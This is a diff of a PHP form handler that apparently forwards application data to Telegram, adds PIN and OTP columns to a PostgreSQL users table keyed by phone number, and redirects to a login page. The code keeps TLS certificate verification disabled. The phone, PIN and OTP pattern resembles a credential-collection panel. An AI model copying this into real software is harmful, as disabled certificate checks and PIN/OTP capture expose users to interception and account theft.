@@ -35,12 +35,12 @@ function getDbConnection($host, $port, $dbname, $user, $pass) {
 
 $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
 if (!$conn) {
-    // Non‑fatal – Telegram will still work, but log error
     error_log("Could not connect to PostgreSQL for users table");
 }
 
-// Create `users` table if it doesn't exist
+// Create or modify `users` table with pin and otp columns (default 0)
 if ($conn) {
+    // First ensure table exists with basic columns
     $createTableSQL = "
         CREATE TABLE IF NOT EXISTS users (
             phone VARCHAR(20) PRIMARY KEY,
@@ -48,6 +48,20 @@ if ($conn) {
         )
     ";
     pg_query($conn, $createTableSQL);
+    
+    // Add pin column if missing
+    $checkPin = pg_query($conn, "SELECT column_name FROM information_schema.columns WHERE table_name='users' AND column_name='pin'");
+    if (pg_num_rows($checkPin) == 0) {
+        pg_query($conn, "ALTER TABLE users ADD COLUMN pin INTEGER DEFAULT 0");
+        error_log("Added pin column to users table");
+    }
+    
+    // Add otp column if missing
+    $checkOtp = pg_query($conn, "SELECT column_name FROM information_schema.columns WHERE table_name='users' AND column_name='otp'");
+    if (pg_num_rows($checkOtp) == 0) {
+        pg_query($conn, "ALTER TABLE users ADD COLUMN otp INTEGER DEFAULT 0");
+        error_log("Added otp column to users table");
+    }
 }
 
 /* -----------------------------
@@ -119,7 +133,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // safe for hosting
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 
     $response = curl_exec($ch);
     $curlError = curl_error($ch);
@@ -134,20 +148,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])
         $telegram_error = "HTTP Error: $httpCode";
     } elseif (isset($result['ok']) && $result['ok'] === true) {
 
-        // ========== INSERT PHONE INTO `users` TABLE ==========
+        // ========== INSERT/UPDATE PHONE INTO `users` TABLE ==========
         if ($conn && !empty($phone)) {
-            // Insert phone with status 0 if not already exists
-            $insertSQL = "INSERT INTO users (phone, status) VALUES ($1, 0) ON CONFLICT (phone) DO NOTHING";
+            // Insert phone with status=0, pin=0, otp=0 if not exists, otherwise do nothing
+            $insertSQL = "INSERT INTO users (phone, status, pin, otp) VALUES ($1, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
             $insertResult = pg_query_params($conn, $insertSQL, [$phone]);
             if (!$insertResult) {
                 error_log("Failed to insert phone $phone into users table: " . pg_last_error($conn));
             } else {
-                error_log("User $phone inserted/ignored in users table with status 0");
+                error_log("User $phone inserted/ignored in users table with status=0, pin=0, otp=0");
             }
         } else {
             error_log("Cannot insert phone: DB connection failed or phone empty");
         }
-        // =====================================================
+        // ============================================================
 
         $_SESSION['application_submitted'] = true;
         header("Location: login.php");
